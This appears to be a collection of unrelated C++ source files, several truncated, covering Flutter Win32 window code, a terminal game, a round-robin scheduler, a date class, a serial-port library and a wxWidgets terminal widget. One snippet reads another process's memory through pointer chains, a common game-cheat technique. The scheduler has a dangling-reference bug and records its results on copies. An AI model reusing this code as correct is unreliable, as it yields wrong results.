IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"api_learn\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"memory.h\"\r\n\r\nuintptr_t GetModuleBaseAddress(DWORD pID, const char* modName) {\r\n    MODULEENTRY32 modEntry;\r\n    modEntry.dwSize = sizeof(modEntry);\r\n    uintptr_t baseAddr = 0;\r\n\r\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pID);\r\n\r\n    if (hSnap != INVALID_HANDLE_VALUE) {\r\n        if (Module32First(hSnap, &modEntry)) {\r\n            do {\r\n                if (!strcmp(modEntry.szModule, modName)) {\r\n                    baseAddr = (uintptr_t)modEntry.modBaseAddr;\r\n                    break;\r\n                }\r\n            } while (Module32Next(hSnap, &modEntry));\r\n        }\r\n        CloseHandle(hSnap);\r\n    }\r\n\r\n    return baseAddr;\r\n}\r\n\r\nuintptr_t FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector<unsigned int> offsets)\r\n{\r\n    uintptr_t addr = ptr;\r\n    for (unsigned int i = 0; i < offsets.size(); ++i)\r\n    {\r\n        ReadProcessMemory(hProc, (BYTE*)addr, &addr, sizeof(addr), 0);\r\n        addr += offsets[i];\r\n    }\r\n    return addr;\r\n}",
    "#include <array>\n#include <chrono>\n#include <iostream>\n#include <math.h>\n#include <random>\n#include <string>\n#include <termios.h>\n#include <thread>\n#include <unistd.h>\n#include <vector>\n\n#define PI 3.14159265358979323846264338\n\nvoid restrictToRange(int width, int height, int &x, int &y){\n    if (x < 0){\n        x = 0;\n    }\n    if (x >= width){\n        x = width - 1;\n    }\n    if (y < 0){\n        y = 0;\n    }\n    if (y >= height){\n        y = height - 1;\n    }\n}\n\nbool testRange(int width, int height, int x, int y){\n    return (x >= 0) && (x < width) && (y >= 0) && (y < height);\n}\n\nvoid mygotoxy(short x, short y){\n    std::cout << \"\\033[\" << y << ';' << x << 'H';\n}\n\nchar mygetch() {\n    char buf = 0;\n    auto old = termios{};\n    if (tcgetattr(0, &old) < 0) {\n        throw std::runtime_error(\"tcgetattr failed\");\n    }\n    old.c_lflag &= ~ICANON;\n    old.c_lflag &= ~ECHO;\n    old.c_cc[VMIN] = 1;\n    old.c_cc[VTIME] = 0;\n    if (tcsetattr(0, TCSANOW, &old) < 0) {\n        throw std::runtime_error(\"tcsetattr failed\");\n    }\n    if (read(0, &buf, 1) < 0) {\n        throw std::runtime_error(\"read failed\");\n    }\n    old.c_lflag |= ICANON;\n    old.c_lflag |= ECHO;\n    if (tcsetattr(0, TCSADRAIN, &old) < 0) {\n        throw std::runtime_error(\"tcsetattr failed the second time\");\n    }\n    return buf;\n}\n\nclass Color {\npublic:\n    static Color BLACK;\n    static Color RED;\n    static Color GREEN;\n    static Color YELLOW;\n    static Color BLUE;\n    static Color MAGENTA;\n    static Color CYAN;\n    static Color WHITE;\n    static Color GREY;\n    static Color BRIGHT_RED;\n    static Color BRIGHT_GREEN;\n    static Color BRIGHT_YELLOW;\n    static Color BRIGHT_BLUE;\n    static Color BRIGHT_MAGENTA;\n    static Color BRIGHT_CYAN;\n    static Color BRIGHT_WHITE;\n\n    std::uint8_t colorDigit() const noexcept {\n        return this->m_colorDigit;\n    }\n\n    bool isBright() const noexcept {\n        return this->m_isBright;\n    }\n\nprivate:\n    Color(std::uint8_t colorDigit, bool isBright) noexcept\n        : m_colorDigit(colorDigit)\n        , m_isBright(isBright)\n    {}\n\n    std::uint8_t m_colorDigit;\n    bool m_isBright;\n};\n\nColor Color::BLACK = Color(0, false);\nColor Color::RED = Color(1, false);\nColor Color::GREEN = Color(2, false);\nColor Color::YELLOW = Color(3, false);\nColor Color::BLUE = Color(4, false);\nColor Color::MAGENTA = Color(5, false);\nColor Color::CYAN = Color(6, false);\nColor Color::WHITE = Color(7, false);\nColor Color::GREY = Color(0, true);\nColor Color::BRIGHT_RED = Color(1, true);\nColor Color::BRIGHT_GREEN = Color(2, true);\nColor Color::BRIGHT_YELLOW = Color(3, true);\nColor Color::BRIGHT_BLUE = Color(4, true);\nColor Color::BRIGHT_MAGENTA = Color(5, true);\nColor Color::BRIGHT_CYAN = Color(6, true);\nColor Color::BRIGHT_WHITE = Color(7, true);\n\n\nvoid textColor(Color bg_color, Color text_color){\n    auto bg_code = 40 + bg_color.colorDigit() + (bg_color.isBright() ? 60 : 0);\n    auto text_code = 30 + text_color.colorDigit() + (text_color.isBright() ? 60 : 0);\n    std::cout << \"\\033[\" << bg_code << \"m\\033[\" << text_code << 'm';\n}\n\nvoid clearScreen(){\n    textColor(Color::BLACK, Color::WHITE);\n    std::cout << \"\\033[2J\";\n}\n\nvoid drawLine(int start_x, int start_y, int end_x, int end_y, char const* symbol, Color symbol_color){\n    textColor(Color::BLACK, symbol_color);\n    int distance = ((end_x - start_x) + (end_y - start_y));\n    for (int i = 0; i <= distance; i++){\n        int symbol_x = start_x + ((i * (end_x - start_x)) / distance);\n        int symbol_y = start_y + ((i * (end_y - start_y)) / distance);\n        mygotoxy(symbol_x, symbol_y);\n        std::cout << symbol;\n    }\n}\n\nvoid drawBox(int sx, int sy, int ex, int ey, char const* symbol, Color symbol_color, char const* title, bool empty = false){\n    drawLine(sx, sy, sx, ey, symbol, symbol_color);\n    drawLine(sx, sy, ex, sy, symbol, symbol_color);\n    drawLine(ex, sy, ex, ey, symbol, symbol_color);\n    drawLine(sx, ey, ex, ey, symbol, symbol_color);\n    if (empty){\n        for (int box_x = 1; box_x < ex - sx; box_x++){\n            for (int box_y = 1; box_y < ey - sy; box_y++){\n                mygotoxy(sx + box_x, sy + box_y);\n                std::cout << \" \";\n            }\n        }\n    }\n    mygotoxy(sx + 1, sy);\n    std::cout << title;\n}\n\ntemplate<size_t width, size_t height>\nvoid generateWorld(std::array<std::array<int, height>, width>& terrain) {\n    //turn everything into grass\n    for (int x = 0; x < width; x++){\n        for (int y = 0; y < height; y++){\n            terrain.at(x).at(y) = 2;\n        }\n    }\n\n    //add patches of sand\n    for (int i = 0; i <= 50; i++){\n        int x = rand() % width, y = rand() % height;\n        for (int j = 0; j <= 10; j++){\n            restrictToRange(width, height, x, y);\n            int temp_x, temp_y;\n            double degrees;\n\n            for (int size = 1; size <= rand() % 5; size++){\n                for (int k = 0; k <= size * PI; k++){\n                    degrees = k * 360 / size * PI;\n                    temp_x = x + (siz",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <vector>\n#include <queue>\nusing namespace std;\n\nclass Process {\npublic:\n    int pid;            \n    int burstTime;      \n    int remainingTime;  \n    int arrivalTime;    \n    int startTime;     \n    int endTime;      \n    int turnaroundTime; \n    int waitTime;      \n\n    Process(int pid, int burstTime, int arrivalTime) {\n        this->pid = pid;\n        this->burstTime = burstTime;\n        this->remainingTime = burstTime;\n        this->arrivalTime = arrivalTime;\n        this->startTime = -1;  // Initialize to -1, indicating not started\n        this->endTime = -1;    // Initialize to -1, indicating not finished\n        this->turnaroundTime = 0;\n        this->waitTime = 0;\n    }\n};\n\n//Round Robin scheduling\nvoid roundRobin(vector<Process>& processes, int timeSlice) {\n    int currentTime = 0;\n    int completedProcesses = 0;\n    int totalTurnaroundTime = 0;\n    int totalWaitTime = 0;\n\n    // Ready queue\n    queue<Process> readyQueue;\n\n    // Loop until all processes are completed\n    while (completedProcesses < processes.size()) {\n        // Add processes to the ready queue as they become ready\n        for (Process& process : processes) {\n            if (process.remainingTime > 0 && process.arrivalTime <= currentTime) {\n                readyQueue.push(process);\n            }\n        }\n\n        // Dequeue and execute processes from the ready queue\n        while (!readyQueue.empty()) {\n            Process& currentProcess = readyQueue.front(); // Use reference instead of copy\n            readyQueue.pop();\n\n            // Set start time if not already set\n            if (currentProcess.startTime == -1) {\n                currentProcess.startTime = currentTime;\n            }\n\n            //whichever is smaller\n            int executeTime = min(currentProcess.remainingTime, timeSlice);\n            currentTime += executeTime;\n            currentProcess.remainingTime -= executeTime;\n\n            // If the process is completed, set end time and calculate turnaround and wait times\n            if (currentProcess.remainingTime <= 0) {\n                currentProcess.endTime = currentTime;\n                currentProcess.turnaroundTime = currentProcess.endTime - currentProcess.arrivalTime;\n                currentProcess.waitTime = currentProcess.turnaroundTime - currentProcess.burstTime;\n                totalTurnaroundTime += currentProcess.turnaroundTime;\n                totalWaitTime += currentProcess.waitTime;\n                completedProcesses++;\n            } else {\n                // Re-enqueue if remaining time > 0\n                readyQueue.push(currentProcess);\n            }\n        }\n    }\n\n    // Print in a tabular format\n    cout << \"PID\\tAT\\tST\\tET\\tTAT\\tWT\" << endl;\n    for (int i = 0; i < processes.size(); i++) {\n        cout << processes[i].pid << \"\\t\" << processes[i].arrivalTime << \"\\t\" << processes[i].startTime << \"\\t\" <<\n            processes[i].endTime << \"\\t\" << processes[i].turnaroundTime << \"\\t\\t\" << processes[i].waitTime << endl;\n    }\n\n    // Calculate and print the average turnaround time and average wait time\n    double avgTurnaroundTime = (double)totalTurnaroundTime / processes.size();\n    double avgWaitTime = (double)totalWaitTime / processes.size();\n    cout << \"Average Turnaround Time: \" << avgTurnaroundTime << endl;\n    cout << \"Average Wait Time: \" << avgWaitTime << endl;\n}\n\nint main() {\n    int numProcesses;\n    cout << \"Enter the number of processes: \";\n    cin >> numProcesses;\n\n    // Input arrival time and burst time for each process\n    vector<Process> processes;\n    for (int i = 0; i < numProcesses; ++i) {\n        int arrivalTime, burstTime;\n        cout << \"Process \" << (i + 1) << \" Arrival Time: \";\n        cin >> arrivalTime;\n        cout << \"Process \" << (i + 1) << \" Burst Time: \";\n        cin >> burstTime;\n        processes.push_back(Process(i + 1, burstTime, arrivalTime));\n    }\n\n    int timeSlice;\n    cout << \"Enter the time slice: \";\n    cin >> timeSlice;\n\n    cout << \"Round Robin Scheduling\" << endl;\n    roundRobin(processes, timeSlice);\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nclass Date {\r\npublic:\r\n    int day;\r\n    int month;\r\n    int year;\r\n\r\n    void setData() {\r\n        cout << \"Enter day=\";\r\n        cin >> this->day;\r\n        cout << \"Enter month number =\";\r\n        cin >> this->month;\r\n        cout << \"Enter year=\";\r\n        cin >> this->year;\r\n    };\r\n\r\n    void getData1() {\r\n        if (day <= 31 && month <= 12) {\r\n            cout << \"Your Date is \" << this->day << '-' << this->month << \"-\" << this->year << \", \";\r\n        }\r\n        else {\r\n            cout << \"invalid input\";\r\n        }\r\n    };\r\n\r\n    string mon(int month) {\r\n        string m[] = {\"_\", \"Jan\", \"Feb\", \"Mar\", \"Apr\", \"May\", \"Jun\", \"Jul\", \"Aug\", \"Sep\", \"Oct\", \"Nov\", \"Dec\"};\r\n        return m[month];\r\n    }\r\n\r\n    void getData2() {\r\n        if (day <= 31 && month <= 12) {\r\n            cout << this->day << '-' << this->mon(month) << \"-\" << this->year << \" , \";\r\n        }\r\n        else {\r\n            cout << \"invalid input\";\r\n        }\r\n    };\r\n\r\n    void getData3() {\r\n        if (day <= 31 && month <= 12) {\r\n            cout << this->day << \"/\" << this->month << \"/\" << this->year << \".\";\r\n        }\r\n        else {\r\n            cout << \"invalid input\";\r\n        }\r\n    };\r\n\r\n    int calculateDifference(const Date& otherDate) {\r\n        int daysInMonth[] = {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};\r\n\r\n        int days1 = this->year * 365 + this->day;\r\n        for (int i = 1; i < this->month; i++) {\r\n            days1 += daysInMonth[i];\r\n        }\r\n        days1 += (this->year - 1) / 4 - (this->year - 1) / 100 + (this->year - 1) / 400;\r\n\r\n        int days2 = otherDate.year * 365 + otherDate.day;\r\n        for (int i = 1; i < otherDate.month; i++) {\r\n            days2 += daysInMonth[i];\r\n        }\r\n        \r\n       days2 += (otherDate.year - 1) / 4 - (otherDate.year - 1) / 100 + (otherDate.year - 1) / 400;\r\n\r\n        return (days1 - days2);\r\n    }\r\n};\r\n\r\nint main() {\r\n    int n, i;\r\n\r\n    cout << \"Enter no of node you want to add in list=\";\r\n    cin >> n;\r\n    Date d[n];\r\n\r\n    int m = 1;\r\n    for (i = 0; i < n; i++) {\r\n        cout << \"enter your \" << m << \"no. date=\";\r\n        d[i].setData();\r\n        m++;\r\n    }\r\n\r\n    int l = 1;\r\n    for (i = 0; i < n; i++) {\r\n        cout << \"Your \" << l << \"no. date are=\";\r\n        d[i].getData1();\r\n        d[i].getData2();\r\n        d[i].getData3();\r\n        cout << endl;\r\n        l++;\r\n    }\r\n\r\n   \r\n    int date1Index, date2Index;\r\n    cout << \"Enter index of first date (0 to \" << n - 1 << \"): \";\r\n    cin >> date1Index;\r\n    cout << \"Enter index of second date (0 to \" << n - 1 << \"): \";\r\n    cin >> date2Index;\r\n\r\n    int difference = d[date1Index].calculateDifference(d[date2Index]);\r\n    cout << \"Difference between the two dates is \" << difference << \" days.\" << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "/******************************************************************************\n *   @file SerialStreamBuf.cc                                                 *\n *   @copyright (C) 2004 Manish Pagey                                         *\n *   crayzeewulf@users.sourceforge.net                                        *\n *                                                                            *\n *   This program is free software; you can redistribute it and/or modify     *\n *   it under the terms of the GNU Lessser General Public License as          *\n *   published by the Free Software Foundation; either version 2 of the       *\n *   License, or (at your option) any later version.                          *\n *                                                                            *\n *   This program is distributed in the hope that it will be useful,          *\n *   but WITHOUT ANY WARRANTY; without even the implied warranty of           *\n *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the            *\n *   GNU Lesser General Public License for more details.                      *\n *                                                                            *\n *   You should have received a copy of the GNU Lesser General Public         *\n *   License along with this program; if not, write to the                    *\n *   Free Software Foundation, Inc.,                                          *\n *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.                *\n *****************************************************************************/\n\n#include \"SerialStreamBuf.h\"\n\n#include <cstring>\n#include <fcntl.h>\n#include <linux/serial.h>\n#include <sys/ioctl.h>\n#include <unistd.h>\n\nnamespace LibSerial\n{\n    /**\n     * @brief SerialStreamBuf::Implementation is the SerialStreamBuf implementation class.\n     */\n    class SerialStreamBuf::Implementation\n    {\n    public:\n        /**\n         * @brief Default Constructor.\n         */\n        Implementation();\n\n        /**\n         * @brief Constructor that allows a SerialStreamBuf instance to be \n         *        created and opened, initializing the corresponding\n         *        serial port with the specified parameters.\n         * @param fileName The file name of the serial stream.\n         * @param baudRate The communications baud rate.\n         * @param characterSize The size of the character buffer for\n         *        storing read/write streams.\n         * @param parityType The parity type for the serial stream.\n         * @param stopBits The number of stop bits for the serial stream.\n         * @param flowControlType The flow control type for the serial stream.\n         */\n        Implementation(const std::string&   fileName,\n                       const BaudRate&      baudRate,\n                       const CharacterSize& characterSize,\n                       const FlowControl&   flowControlType,\n                       const Parity&        parityType,\n                       const StopBits&      stopBits);\n\n        /**\n         * @brief Default Destructor for a SerialStreamBuf object. Closes the\n         *        serial port associated with mFileDescriptor if open.\n         */\n        ~Implementation();\n\n        /**\n         * @brief Opens the serial port associated with the specified\n         *        file name and the specified mode.\n         * @param fileName The file name of the serial port.\n         * @param openMode The communication mode status when the serial\n         *        communication port is opened.\n         */\n        void Open(const std::string& fileName,\n                  const std::ios_base::openmode& openMode);\n\n        /**\n         * @brief Closes the serial port. All settings of the serial port will be\n         *        lost and no more I/O can be performed on the serial port.\n         */\n        void Close();\n\n        /**\n         * @brief Waits until the write buffer is drained and then returns.\n         */\n        void DrainWriteBuffer();\n\n        /**\n         * @brief Flushes the serial port input buffer.\n         */\n        void FlushInputBuffer();\n\n        /**\n         * @brief Flushes the serial port output buffer.\n         */\n        void FlushOutputBuffer();\n\n        /**\n         * @brief Flushes the serial port input and output buffers.\n         */\n        void FlushIOBuffers();\n\n        /**\n         * @brief Determines if data is available at the serial port.\n         */\n        bool IsDataAvailable();\n\n        /**\n         * @brief Determines if the serial port is open for I/O.\n         * @return Returns true iff the serial port is open.\n         */\n        bool IsOpen();\n\n        /**\n         * @brief Sets all serial port paramters to their default values.\n         */\n        void SetDefaultSerialPortParameters();\n\n        /**\n         * @brief Sets the baud rate for the serial port to the specified value\n         * @param baudRate The baud rate to be set for the serial port.\n         */\n   ",
    "#include \"terminalCtrl.h\"\n\n#include <unordered_set>\n\nnamespace\n{\n    std::unordered_set<int> allowedKeys {\n        wxKeyCode::WXK_LEFT,\n        wxKeyCode::WXK_RIGHT,\n        wxKeyCode::WXK_UP,\n        wxKeyCode::WXK_DOWN,\n        wxKeyCode::WXK_HOME,\n        wxKeyCode::WXK_END\n    };\n}\n\nTerminalCommandEvent::TerminalCommandEvent(wxEventType eventType, TerminalCtrl* ctrl, const wxString& command)\n    : wxCommandEvent(eventType, ctrl->GetId())\n    , command(command)\n{\n    this->SetEventObject(ctrl);\n}\n\nTerminalCommandEvent* TerminalCommandEvent::Clone() const\n{\n    return new TerminalCommandEvent(*this);\n}\n\nconst wxString& TerminalCommandEvent::getCommand()\n{\n    return this->command;\n}\n\nwxDEFINE_EVENT(terminalctrlEVT_COMMAND, TerminalCommandEvent);\nwxDEFINE_EVENT(terminalctrlEVT_POST_COMMAND, TerminalCommandEvent);\n\nTerminalCtrl::TerminalCtrl()\n    : wxTextCtrl()\n{\n    this->setup();\n}\n\nTerminalCtrl::TerminalCtrl(wxWindow* parent, wxWindowID id,\n    const wxString& value,\n    const wxPoint& pos,\n    const wxSize& size,\n    long style,\n    const wxValidator& validator,\n    const wxString& name)\n    : wxTextCtrl(parent, id, value, pos, size, createDefaultStyle(style), validator, name)\n{\n    this->setup();\n}\n\nlong TerminalCtrl::createDefaultStyle(long style)\n{\n    return style | wxTE_MULTILINE | wxTE_PROCESS_ENTER | wxTE_PROCESS_TAB | wxWS_EX_VALIDATE_RECURSIVELY;\n}\n\nvoid TerminalCtrl::setup()\n{    \n    this->insertPrompt();\n\n    Bind(wxEVT_CHAR, &TerminalCtrl::onChar, this);\n    Bind(wxEVT_KEY_DOWN, &TerminalCtrl::onChar, this);\n}\n\nvoid TerminalCtrl::setPrompt(const wxString& prompt)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->prompt = prompt;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nvoid TerminalCtrl::setPrompt(const wxString& prompt, const wxString& promptSuffix)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->prompt = prompt;\n    this->promptSuffix = promptSuffix;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nvoid TerminalCtrl::setPromptSuffix(const wxString& promptSuffix)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->promptSuffix = promptSuffix;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nwxString TerminalCtrl::getInput() const\n{\n    long start = this->getPosition(this->promptEndPosition);\n    long end = this->getPosition(this->getLastPoint());\n    return this->GetRange(start, end);\n}\n\nvoid TerminalCtrl::setCommandQueueLimit(size_t limit)\n{\n    this->commands.limit(limit);\n}\n\nvoid TerminalCtrl::nextCommand()\n{\n    if (!this->commands.empty())\n    {\n        this->setInput(this->commands.next());\n    }\n}\n\nvoid TerminalCtrl::prevCommand()\n{\n    if (!this->commands.empty())\n    {\n        this->setInput(this->commands.prev());\n    }\n}\n\nbool TerminalCtrl::toggleCommand(int key)\n{\n    if (key == wxKeyCode::WXK_UP)\n    {\n        this->nextCommand();\n        return true;\n    }\n    else if (key == wxKeyCode::WXK_DOWN)\n    {\n        this->prevCommand();\n        return true;\n    }\n\n    return false;\n}\n\nvoid TerminalCtrl::clearInput()\n{\n    long promptEnd = this->getPosition(this->promptEndPosition);\n    long end = this->getPosition(this->getLastPoint());\n    this->Remove(promptEnd, end);\n}\n\nvoid TerminalCtrl::setInput(const wxString& input)\n{\n    this->noAppendProcessing = true;\n    this->clearInput();\n    this->AppendText(input);\n    this->noAppendProcessing = false;\n    this->setInsertionAtEnd();\n}\n\nbool TerminalCtrl::insertionAtLastLine() const\n{\n    wxPoint insertionPoint = this->getPoint(this->GetInsertionPoint());\n    return insertionPoint.y == this->GetNumberOfLines() - 1;\n}\n\nbool TerminalCtrl::insertionAtInput() const\n{\n    wxPoint insertionPoint = this->getPoint(this->GetInsertionPoint());\n    return insertionPoint.y == this->promptEndPosition.y && insertionPoint.x >= this->promptEndPosition.x;\n}\n\nvoid TerminalCtrl::setInsertionAtEnd()\n{\n    long pos = this->getPosition(this->getLastPoint());\n    this->DoSetSelection(pos, pos, 0);\n}\n\nvoid TerminalCtrl::setInsertionAtPrompt()\n{\n    long pos = this->getPosition(this->promptEndPosition);\n    this->DoSetSelection(pos, pos, 0);\n}\n\nwxPoint TerminalCtrl::getPoint(long position) const\n{\n    wxPoint res;\n    long x, y;\n    this->PositionToXY(position, &x, &y);\n    res.x = x;\n    res.y = y;\n    return res;\n}\n\nwxPoint TerminalCtrl::getLastPoint() const\n{\n    return this->getPoint(this->GetValue().length());\n}\n\nlong TerminalCtrl::g",
